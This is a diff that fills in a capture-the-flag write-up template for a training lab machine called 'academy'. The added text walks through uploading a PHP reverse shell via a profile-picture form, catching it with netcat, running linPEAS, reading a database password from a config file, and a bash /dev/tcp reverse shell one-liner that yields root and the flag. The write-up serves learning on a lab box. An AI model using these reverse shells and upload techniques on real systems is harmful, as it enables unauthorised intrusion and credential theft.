@@ -10,7 +10,6 @@
 - [Exploitation](#exploitation)
 - [Privilege Escalation](#privilege-escalation)
 - [Flag Retrieval](#flag-retrieval)
-- [Conclusion](#conclusion)
 - [Resources](#resources)
 
 ---
@@ -71,35 +70,89 @@ Explain how you approached exploiting the challenge:
 
 -using the web browser, i accessed /academy and logged in using the login info
 
+![Login Page](./img/login.png)
+
+I clicked around the website and saw a profile page where I could upload a picture,
+perfect opportunity for a reverse shell.
+
+I used https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+and saved it onto a file called shell.php
+I used netcat to set up a listening port on my machine to let me know if i popped a shell
+-└─$ nc -nvlp 1234
 
 
-- Vulnerabilities or weaknesses identified
-- Tools used (exploit frameworks, custom scripts, etc.)
-- Step-by-step breakdown of the exploitation process
-- Screenshots, code snippets, or command outputs to illustrate each step
+successfully uploaded file onto student profile pic
+
+![Login Page](./img/shell.png)
+
+└─$ nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [192.168.64.2] from (UNKNOWN) [192.168.64.4] 35406
+Linux academy 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64 GNU/Linux
+ 23:50:25 up  3:33,  1 user,  load average: 0.00, 0.58, 1.07
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+root     tty1     -                06:39   17:10m  0.36s  0.22s -bash
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+
 
 ## Privilege Escalation
 If applicable, describe how you escalated privileges:
-- Any misconfigurations or vulnerabilities identified
-- Exploits or techniques used for privilege escalation
-- Detailed explanation of how you gained higher-level access
+
+saved linpeas onto my device to upload it to my target
+https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+
+ran linpeah.sh on the target and found some interesting information:
+    grimmie:x:1000:1000:administrator,,,:/home/grimmie:/bin/bash                                                                                               
+    * * * * * /home/grimmie/backup.sh
+    
+    $ cat /var/www/html/academy/includes/config.php
+    <?php
+    $mysql_hostname = "localhost";
+    $mysql_user = "grimmie";
+    $mysql_password = "My_V3ryS3cur3_P4ss";
 
 ## Flag Retrieval
 Detail how you located and captured the flag(s):
-- Method used to identify the flag location
-- Exact flag(s) content and format
-- Proof of flag retrieval (screenshot or flag content)
+I set up a listening port on my machine and ran a single line shell on the target device:
+  bash -i >& /dev/tcp/192.168.64.2/8081 0>&1
 
-## Conclusion
-Summarize your experience and takeaways from the challenge:
-- Lessons learned during the CTF
-- New skills or knowledge gained
-- Challenges faced and how you overcame them
-- Shoutouts or acknowledgments to teammates or resources
+      └─# nc -nvlp 8081       
+      listening on [any] 8081 ...
+      connect to [192.168.64.2] from (UNKNOWN) [192.168.64.4] 57998
+      bash: cannot set terminal process group (12851): Inappropriate ioctl for device
+      bash: no job control in this shell
+      root@academy:~# whoami
+      whoami
+      root
+      
+-Verified root access
+
+      root@academy:~# cd root
+      cd root
+      bash: cd: root: No such file or directory
+      root@academy:~# ls
+      ls
+      flag.txt
+
+- Flag has been found
+  
+      root@academy:~# cat flag.txt
+      cat flag.txt
+      Congratz you rooted this box !
+      Looks like this CMS isn't so secure...
+      I hope you enjoyed it.
+      If you had any issue please let us know in the course discord.
+      
+      Happy hacking !
+      root@academy:~# 
+
 
 ## Resources
 List any external sources, tools, or references you used:
-- Official documentation
-- Write-ups from other participants (if referred)
-- Tools or frameworks used
+- https://netcat.sourceforge.net/
+- https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS
+- https://github.com/OJ/gobuster
 
